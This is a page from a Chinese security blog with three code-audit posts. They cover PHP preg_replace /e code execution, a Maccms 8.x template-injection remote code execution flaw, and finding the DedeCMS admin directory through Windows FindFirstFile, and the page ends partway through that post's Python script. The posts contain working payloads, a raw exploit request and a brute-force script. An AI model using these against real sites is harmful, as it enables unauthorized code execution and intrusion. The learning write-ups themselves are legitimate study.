<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/14/preg_replace函数与命令执行/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/14/preg_replace函数与命令执行/" itemprop="url">浅淡preg_replace函数与命令执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-14T08:15:41+08:00">
                2018-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近在看法师seay的《代码审计》,在代码审计小技巧一章中提到了preg_replace()函数造成的命令执行,以前不了解,遂去网上查资料,看到红日的表哥们发的有关的题目和详解(链接在结尾),自己跟着复现学习一下。</p>
</blockquote>
<hr>
<p>题目的php代码:</p>
<pre><code>    header(&quot;Content-Type: text/plain&quot;);
function complexStrtolower($regex, $value){
    return preg_replace(&apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value);
}

foreach ($_GET as $regex =&gt; $value) {
    echo complexStrtolower($regex, $value) . &quot;\n&quot;;
    #var_dump($_GET);
}
</code></pre><p>###<strong>代码分析:</strong><br><strong>1.基础知识:</strong><br>首先我们先了解下<code>preg_replace()</code>函数:</p>
<blockquote>
<p>###<strong>preg_replace</strong>：(PHP 5.5)</p>
<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
<p><strong>定义</strong> ： mixed preg_replace ( mixed \$pattern , mixed \$replacement , mixed<br>\$subject [, int \$limit = -1 [, int &amp;$count ]] )</p>
<p>搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换</p>
</blockquote>
<p>观察题目可知,这道题目考察的是 <code>preg_replace()</code> 函数<br>�<code>preg_replace()</code>函数的第一个参数<code>$pattern</code>为正则表达式,如果存在/e修正符,则会造成代码执行漏洞</p>
<blockquote>
<p>/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</p>
</blockquote>
<p><code>preg_replace()</code>函数的第二个参数是对前面正则表达式捕获的子匹配项的引用<br>在上面题目的代码中, \1其实代表的就是\1,因为\1在””里头才需要写成\1 一般出现在正则表达式中, \1代表第一个()里面匹配到的内容。</p>
<p>第三个参数$subject就是源字符串</p>
<p>这道题的关键是通过控制传入的<code>$_GET</code>参数—&gt;来控制正则的同时修改后面的php代码,达到命令执行</p>
<p><strong>2.payload分析:</strong></p>
<p>A.官方给的payload:<br><img src="http://static.zybuluo.com/chhyx/u7qp6ma6swytyuuloxeoizfe/image_1cnaspepa1pc31ma51fpn1del1mkem.png" alt="image_1cnaspepa1pc31ma51fpn1del1mkem.png-56.7kB"></p>
<pre><code>?.*={${phpinfo()}} 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/37auiz8d3kxac0nr74jy0o7o/image_1cn9rc5efh9u1mu7cns35v1ggo8l.png" alt="image_1cn9rc5efh9u1mu7cns35v1ggo8l.png-24.8kB"></p>
<p>不成功,原因是php会对非法的GET参数名进行<code>_</code>处理,我们简单测试一下</p>
<p>当参数名首字母不为非法字母时:<br><img src="http://static.zybuluo.com/chhyx/c8fue25oesvraweqm1j72xa2/image_1cn9t9vkscq017be1hqsgq51v3uac.png" alt="image_1cn9t9vkscq017be1hqsgq51v3uac.png-24.2kB"></p>
<p>当参数名首字母为非法字母时:<br><img src="http://static.zybuluo.com/chhyx/5ihlmuv6d6pnio3pokdoacmy/image_1cn9tb1h5t201mh71j9a9judkmap.png" alt="image_1cn9tb1h5t201mh71j9a9judkmap.png-23kB"></p>
<p>在参数名首字母不为非法字母的情况下: 、+、.、[、_等字符会被php替换为下划线_<br>在参数名首字母为非法字母的情况下,只有<code>.</code>会被替换</p>
<p>B.<a href="https://mochazz.github.io/" target="_blank" rel="noopener">mochazz</a>大佬给的payload:</p>
<pre><code>?\S*=${phpinfo()}
</code></pre><p><img src="http://static.zybuluo.com/chhyx/6h7mup27z0995qx0dvl8q75w/image_1cn9gccpu1uho6u2fhj1csc1hdhm.png" alt="image_1cn9gccpu1uho6u2fhj1csc1hdhm.png-54.5kB"></p>
<p>没成功</p>
<p>C.在大佬给出的payload基础上添加@成功执行:<br><img src="http://static.zybuluo.com/chhyx/j37gr8avyr3v45ndy0qytxuf/image_1cn9ggl161m8v3rfdre1qc2ds81j.png" alt="image_1cn9ggl161m8v3rfdre1qc2ds81j.png-61.8kB"></p>
<p>我又测试了几个特殊字符:<br>空格<br><img src="http://static.zybuluo.com/chhyx/y9o3ndn44gkedid8zj4uh1z0/image_1cn9lo3usqvf1vkc3271tk91blcp.png" alt="image_1cn9lo3usqvf1vkc3271tk91blcp.png-16.4kB"></p>
<p>tab键:<br><img src="http://static.zybuluo.com/chhyx/7oihl123nb36bkr4gpn07fxj/image_1cn9lr00g1bu21rq12lm18071bvj30.png" alt="image_1cn9lr00g1bu21rq12lm18071bvj30.png-31.4kB"></p>
<p>注释符:<br><img src="http://static.zybuluo.com/chhyx/aderv7yvf2d1eqxr80b908y8/image_1cn9lorrd9mh1u391h1paml1ms116.png" alt="image_1cn9lorrd9mh1u391h1paml1ms116.png-27.7kB"></p>
<p>换行回车符:<br><img src="http://static.zybuluo.com/chhyx/xlta3052ww2lfv9r9j61uab7/image_1cn9lsn7u1bh71ranetp106a18pp3d.png" alt="image_1cn9lsn7u1bh71ranetp106a18pp3d.png-31.3kB"></p>
<p>+号:<br><img src="http://static.zybuluo.com/chhyx/ki9jkuuv3mox01p617nc8m8c/image_1cn9lufli100t107onef33dfl54a.png" alt="image_1cn9lufli100t107onef33dfl54a.png-26.7kB"></p>
<p>用py脚本FUZZ了一下：<br><img src="http://static.zybuluo.com/chhyx/jc6cemzxfhn044vyxropibf1/image_1cn9pnrum57a2ossu81ebcl227r.png" alt="image_1cn9pnrum57a2ossu81ebcl227r.png-37.8kB"></p>
<p>可成功执行的<br>ascii为1-31的特殊字符、!、-、@、~、/**/等字符</p>
<p>添加ascii值为1-31的直接访问:<br><img src="http://static.zybuluo.com/chhyx/1wys2prczkntgxpoyq1kk07c/image_1cn9p5uqj1qd51ttr6of1vkp12cs64.png" alt="image_1cn9p5uqj1qd51ttr6of1vkp12cs64.png-38.8kB"><br>下载下来观察文件内容,其为phpinfo()的内容:<br><img src="http://static.zybuluo.com/chhyx/acmiakc0p0xhnflyq12a21pe/image_1cn9pfe3a17ljb3415l01ir31pj76u.png" alt="image_1cn9pfe3a17ljb3415l01ir31pj76u.png-121.5kB"><br>在burp中也可以直接访问到:<br><img src="http://static.zybuluo.com/chhyx/118ueq4u2bd6fiun7oohft9d/image_1cn9ppt7k19f01b7p1n8d1vspb7s88.png" alt="image_1cn9ppt7k19f01b7p1n8d1vspb7s88.png-74.4kB"></p>
<p><strong>3.补充知识:</strong><br>A.我们思考为什么匹配到<code>{${phpinfo()}}</code> 或者 <code>${phpinfo()}</code> 才能执行 phpinfo 函数<br>在seay大大的《代码审计–企业级Web代码安全架构》中的审计小技巧篇也有提及php可变变量:</p>
<blockquote>
<p>部分PHP应用在写配置文件或者使用preg_replace()函数第二个参数赋值变量时，会用到双引号(“)来代表string型给变量赋值，在PHP语言中，单引号和双引号是有区别的，单引号代表纯字符串，而双引号则是会解析中间的变量，所以在使用双引号时会存在代码执行漏洞。</p>
</blockquote>
<p>测试例子:<br><img src="http://static.zybuluo.com/chhyx/y7a4cf9mex9fn4ydf1mkn7l9/image_1cn9s9gp61i104s81irubvh1ds99i.png" alt="image_1cn9s9gp61i104s81irubvh1ds99i.png-24.3kB"></p>
<p>B./e模式会转义字符：<br>php手册关于<code>preg_replace()</code>的<a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">介绍</a>有提到：</p>
<blockquote>
<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL)<br>然后进行后向引用替换。</p>
</blockquote>
<p>例子:</p>
<pre><code>&lt;?php
    @preg_replace(&quot;/\[(.*?)\]/e&quot;, &quot;\\1&quot;,          
    $_GET[&apos;code&apos;]);
var_dump($_GET);
?&gt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/76s7upls9y3hcj5hm5dc1tkv/image_1cna00tq2uld140n170g15k41rt6b6.png" alt="image_1cna00tq2uld140n170g15k41rt6b6.png-45.4kB"></p>
<p>成功的payload:</p>
<pre><code>http://127.0.0.1:83/index.php?code=[phpinfo()]
http://127.0.0.1:83/index.php?code=[system(dir)]
</code></pre><p><img src="http://static.zybuluo.com/chhyx/fffr1s49ifyec40fncpe8ftw/image_1cnare5m21d2s1nk01j4un8plbm9.png" alt="image_1cnare5m21d2s1nk01j4un8plbm9.png-27.2kB"></p>
<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a><br><a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/13/代码审计Maccms8.X命令执行/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/13/代码审计Maccms8.X命令执行/" itemprop="url">代码审计 | Maccms8.X命令执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-13T08:15:41+08:00">
                2018-09-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<pre><code>payload: /index.php?m=vod-search&amp;wd={if-Z9:phpinfo()}{endif-Z9}
</code></pre><p>###<strong>漏洞简要:</strong><br>wd 参数未经严格过滤导致可以插入程序自写的if标签 经解析导致命令执行</p>
<p>###<strong>代码分析:</strong><br>首先从<strong>index.php</strong>开始分析<br>开头包含了<code>inc/conn.php</code>而<code>conn.php</code>又包含了<code>inc/common/template.php</code> 这个文件是完成漏洞利用的文件 并且这个文件新建了一个类对象:</p>
<pre><code>#inc/common/template.php
class AppTpl
{
    var $markname,$markpar,$markdes,$markval,$markhtml;
    function AppTpl()
    {
......
</code></pre><p>$tpl = new AppTpl();</p>
<p>接着在第15行:<code>$m = be(&#39;get&#39;,&#39;m&#39;);</code> 跟进<code>be()</code>函数,在<code>inc\common\function.php</code>查看功能,主要是对用户输入的数据进行消毒,防止SQL注入<br>接着分析<strong>index.php</strong></p>
<pre><code>   #index.php
   ......
    $m = be(&apos;get&apos;,&apos;m&apos;);
if(strpos($m,&apos;.&apos;)){ $m = substr($m,0,strpos($m,&apos;.&apos;)); } 
$par = explode(&apos;-&apos;,$m);
$parlen = count($par);
$ac = $par[0];
......
$acs = array(&apos;vod&apos;,&apos;art&apos;,&apos;map&apos;,&apos;user&apos;,&apos;gbook&apos;,&apos;comment&apos;,&apos;label&apos;);
    if(in_array($ac,$acs)){
        $tpl-&gt;P[&quot;module&quot;] = $ac;
        include MAC_ROOT.&apos;/inc/module/&apos;.$ac.&apos;.php&apos;;
      }

?&gt;
</code></pre><p>根据payload,我们可得到 <code>\$ac=vod $method=search</code> 第38行包含<code>inc\common\vod.php</code>,我们查看<code>vod.php</code>找到<code>search()</code>方法</p>
<pre><code># /inc/module/vod.php
......
elseif($method==&apos;search&apos;)
{
    $tpl-&gt;P[&quot;siteaid&quot;] = 15;
    $wd = be(&quot;all&quot;, &quot;wd&quot;);//对传入的wd参数进行消毒
    if(!empty($wd)){ $tpl-&gt;P[&quot;wd&quot;] = $wd; }
......
    $tpl-&gt;H = loadFile(MAC_ROOT_TEMPLATE.&quot;/vod_search.html&quot;);
    //加载模板文件
    $tpl-&gt;mark();
    $tpl-&gt;pageshow();
    $colarr = array(&apos;{page:des}&apos;,&apos;{page:key}&apos;,&apos;{page:now}&apos;,&apos;{page:order}&apos;,&apos;{page:by}&apos;,&apos;{page:wd}&apos;,&apos;{page:wdencode}&apos;,&apos;{page:pinyin}&apos;,&apos;{page:letter}&apos;,&apos;{page:year}&apos;,&apos;{page:starring}&apos;,&apos;{page:starringencode}&apos;,&apos;{page:directed}&apos;,&apos;{page:directedencode}&apos;,&apos;{page:area}&apos;,&apos;{page:areaencode}&apos;,&apos;{page:lang}&apos;,&apos;{page:langencode}&apos;,&apos;{page:typeid}&apos;,&apos;{page:typepid}&apos;,&apos;{page:classid}&apos;);
    $valarr = array($tpl-&gt;P[&quot;des&quot;],$tpl-&gt;P[&quot;key&quot;],$tpl-&gt;P[&quot;pg&quot;],$tpl-&gt;P[&quot;order&quot;],$tpl-&gt;P[&quot;by&quot;],$tpl-&gt;P[&quot;wd&quot;],urlencode($tpl-&gt;P[&quot;wd&quot;]),$tpl-&gt;P[&quot;pinyin&quot;],$tpl-&gt;P[&quot;letter&quot;],$tpl-&gt;P[&apos;year&apos;]==0?&apos;&apos;:$tpl-&gt;P[&apos;year&apos;],$tpl-&gt;P[&quot;starring&quot;],urlencode($tpl-&gt;P[&quot;starring&quot;]),$tpl-&gt;P[&quot;directed&quot;],urlencode($tpl-&gt;P[&quot;directed&quot;]),$tpl-&gt;P[&quot;area&quot;],urlencode($tpl-&gt;P[&quot;area&quot;]),$tpl-&gt;P[&quot;lang&quot;],urlencode($tpl-&gt;P[&quot;lang&quot;]),$tpl-&gt;P[&apos;typeid&apos;],$tpl-&gt;P[&apos;typepid&apos;] ,$tpl-&gt;P[&apos;classid&apos;]  );
    $tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);
    //直接写入模板文件
</code></pre><p>这里把我们传入的<code>wd={if-Z9:phpinfo()}{endif-Z9}</code> 赋值给 <code>\$tpl-&gt;P[&quot;wd&quot;]</code> 且这里<code>$tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);</code>对<code>$tpl-&gt;H</code>即vod_search.html做了内容替换,将所有形如:<code>{page:wd}</code>都被替换为<code>{if-A:phpinfo()}{endif-A}</code></p>
<p>接着分析index.php</p>
<pre><code>#index.php
......
    $tpl-&gt;ifex();
    if(!empty($tpl-&gt;P[&apos;cp&apos;])){ setPageCache($tpl-&gt;P[&apos;cp&apos;],$tpl-&gt;P[&apos;cn&apos;],$tpl-&gt;H); }
    $tpl-&gt;run();
    echo $tpl-&gt;H;
</code></pre><p>在这里调用了<code>ifex()</code>函数 我们跟进<code>template.php</code>查看:</p>
<pre><code>#/inc/common/template.php
......
function ifex()
{
    if (!strpos(&quot;,&quot;.$this-&gt;H,&quot;{if-&quot;)) { return; }
    $labelRule = buildregx(&apos;{if-([\s\S]*?):([\s\S]+?)}([\s\S]*?){endif-\1}&apos;,&quot;is&quot;);
    //定义了正则规则
    preg_match_all($labelRule,$this-&gt;H,$iar);
    //匹配出正则提取出来的参数,得到一个二维数组$iar
    $arlen=count($iar[2]);

    for($m=0;$m&lt;$arlen;$m++){//进入循环
        $strn = $iar[1][$m];    //Z9
    $strif= asp2phpif( $iar[2][$m] ) ; //phpinfo
        $strThen= $iar[3][$m];   // 空的
......
</code></pre><p>审计到这里<code>$strif</code>成功的接收了我们插入的php代码(phpinfo) 接着我们要实现eval 接着分析<code>template.php</code></p>
<p>不满足878行的if条件:</p>
<pre><code>if (strpos(&quot;,&quot;.$strThen,$labelRule2)&gt;0){
</code></pre><p>不满足905行的if条件:</p>
<pre><code>if (strpos(&quot;,&quot;.$strThen,$labelRule3)&gt;0){
</code></pre><p>最后进入了没限制的913行的eval函数:</p>
<pre><code>@eval(&quot;if($strif){\$ifFlag=true;}else{\$ifFlag=false;}&quot;);
</code></pre><p>造成命令执行。</p>
<p><strong>漏洞利用:</strong><br><img src="http://static.zybuluo.com/chhyx/nrau74v1g0pby1ejqbc0iz4s/image_1cn8v87tn1p5r1mcjd45ao25aep.png" alt="image_1cn8v87tn1p5r1mcjd45ao25aep.png-58.1kB"></p>
<p><strong>源码下载</strong>:<a href="http://www.maccms.com/down.html1cn8v87tn1p5r1mcjd45ao25aep.png" target="_blank" rel="noopener">Maccms</a></p>
<p>参考文章:<br><a href="http://www.cnblogs.com/test404/p/7397755.html" target="_blank" rel="noopener">http://www.cnblogs.com/test404/p/7397755.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/12/DEDECMS历史难题--找后台目录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/12/DEDECMS历史难题--找后台目录/" itemprop="url">DEDECMS历史难题--找后台目录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-12T08:15:41+08:00">
                2018-09-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>看到先知社区有大佬发了文章<a href="https://xz.aliyun.com/t/2064" target="_blank" rel="noopener">解决DEDECMS历史难题–找后台目录</a>,看完觉得思路不错,决定自己分析总结一波</p>
</blockquote>
<hr>
<p>作者利用了Windows FindFirstFile函数+dedecms对图片的逻辑判断,成功爆出后台目录<br>在法师seay的《代码审计–企业级Web代码安全架构》中也有提及:</p>
<blockquote>
<p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID 读取出文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell 文件路径，但是当在Windows 下时，我们只需要知道文件所在目录，然后利用Windows 的特性就可以访问到文件，这是因为Windows 在搜索文件的时候使用到了FindFirstFile 这一个winapi 函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。<br>利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</p>
</blockquote>
<p>关于网上有人表哥说&lt;也可以读到文件名很长的文件,而法师说的&lt;只能代表一个字符,我们测试一波：</p>
<p>###<strong>本地测试:</strong></p>
<p>首先准备2个文件:</p>
<pre><code>202cb962ac59075b964b07152d234b70.txt
202cb962ac59075b964b07152d234b70.php
</code></pre><p>1.参数需要带文件后缀:</p>
<pre><code>payload:file=2&lt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/t3aop65at2iw48vpwlx1yo9m/image_1cn5ruv7sa6v1f2lv1hfacg6j1m.png" alt="image_1cn5ruv7sa6v1f2lv1hfacg6j1m.png-38.9kB"></p>
<pre><code>payload:file=2&lt;&lt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/jp3khkgebyq124uwgb8eru0n/image_1cn5rvev21hsp1tflakt109013f623.png" alt="image_1cn5rvev21hsp1tflakt109013f623.png-34.1kB"></p>
<p>2.参数不需要带文件后缀:</p>
<pre><code>payload:file=2&lt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vt6vgwse7foft1cqoxrvu6jt/image_1cn5s0ur51kf42ml7q5k511cu72g.png" alt="image_1cn5rvev21hsp1tflakt109013f623.png-34.1kB"></p>
<p>第一种情况显然表明&lt;只能代表一个字符,但是第二种情况又表明一个&lt;也可以读到很长的文件,说明&lt;能否读到很长的文件还要考虑代码这一因素</p>
<p>3.在<a href="http://www.dedecms.com/products/dedecms/downloads/" target="_blank" rel="noopener">dedecms5.6</a>环境下测试:<br>payload:</p>
<pre><code>POST /tags.php HTTP/1.1
Host: 127.0.0.1:82
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

_FILES[p0rZ9][tmp_name]=./p0&lt;&lt;/img/adminico.gif&amp;_FILES[p0rZ9][name]=0&amp;_FILES[p0rZ9][size]=0&amp;_FILES[p0rZ9][type]=image/gif
</code></pre><p><img src="http://static.zybuluo.com/chhyx/g61oaggd05oj4xxxxe3284gb/image_1cn6631mcdvs2n5muc10okai79.png" alt="image_1cn6631mcdvs2n5muc10okai79.png-86.7kB"><br><img src="http://static.zybuluo.com/chhyx/tknt5ez48xwje4i3ob2txidt/image_1cn667lrih84hn44v17ndommm.png" alt="image_1cn667lrih84hn44v17ndommm.png-60.3kB"></p>
<p>可以看到存在与不存在返回的内容是不同的,我们可以根据这个来爆破后台目录<br>但是在测试过程中中我发现在如果含有了相同前缀目录 会对我们的测试造成不可预知的错误<br>具体看操作:</p>
<p><img src="http://static.zybuluo.com/chhyx/2ae5cqoa7ri8zz6zsuja82xd/image_1cn66uapbpgku4h1lmg157pl0n16.png" alt="image_1cn66uapbpgku4h1lmg157pl0n16.png-105kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/9y729960vrzixdazmmb4ii9e/image_1cn66psf16fu1d0i16af1sf965pp.png" alt="image_1cn66psf16fu1d0i16af1sf965pp.png-98.8kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/nw14m24pk94i2f0216pv1j4q/ff4dcaa5-a422-4b9f-a071-a1a5bf1c89f4.png" alt="ff4dcaa5-a422-4b9f-a071-a1a5bf1c89f4.png-86.6kB"></p>
<p>思考了一下这里是因为FindFirstFile函数会找第一个字母正确的文件,然后再去对比<br>所以在这里我们需要把p[a-z,0-9]这样去Fuzz把第一位字符为p的情况都跑一下,得到正确的前缀,与开头字母相同的目录区分开,然后再去爆破后面的<br>根据这个思路,我们就可以用py写一个简单的爆破脚本:</p>
<pre><code>#!/usr/bin/python
# -*- coding: UTF-8 -*-
#author: P0rZ9
#env: python2

import requests
import itertools

url = &apos;http://127.0.0.1:82/tags.php&apos;
flag = 0
string = &apos;abcdefghijklmnopqrstuvwxyz0123456789_!#;.&apos;
result_dir = &apos;&apos;
payload = &apos;./{}&lt;&lt;/img/adminico.gif&apos;
data = {
    &apos;_FILES[p0rZ9][tmp_name]&apos; : payload,
    &apos;_FILES[p0rZ9][name]&apos; : 0,
    &apos;_FILES[p0rZ9][size]&apos; : 0,
    &apos;_FILES[p0rZ9][type]&apos; : &apos;image/gif&apos;
}

#得到前缀 与开头字母相同的目录区分开来
for num in range(1,7):
    if flag:
        break
    for char in itertools.permutations(string,num):#创建迭代器
        char = &apos;&apos;.join(list(char))
        data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = data[&apos;_FILES[p0rZ9][tmp_name]&apos;].format(char)
        re = requests.post(url,data=data)
        if &apos;Upload filetype not allow !&apos; not in re.text and re.status_code == 200:
            flag = 1
            result_dir = char   
            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload
            break
        else:
            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload
print &apos;[+]---test---&apos; + result_dir

flag = 0

#爆破目录
for i in range(50):
    if flag:
        break
    for char in string:
        if char == string[-1]:
            flag = 1
            break
        data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = data[&apos;_FILES[p0rZ9][tmp_name]&apos;].format(result_dir+char)
        #print result_dir+char
        re = requests.post(url, data=data)
        if &quot;Upload filetype not allow !&quot; not in re.text and re.status_code == 200:
            result_dir += char
            print &apos;[+]---test---&apos; + result_dir
            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload
            break
        else:
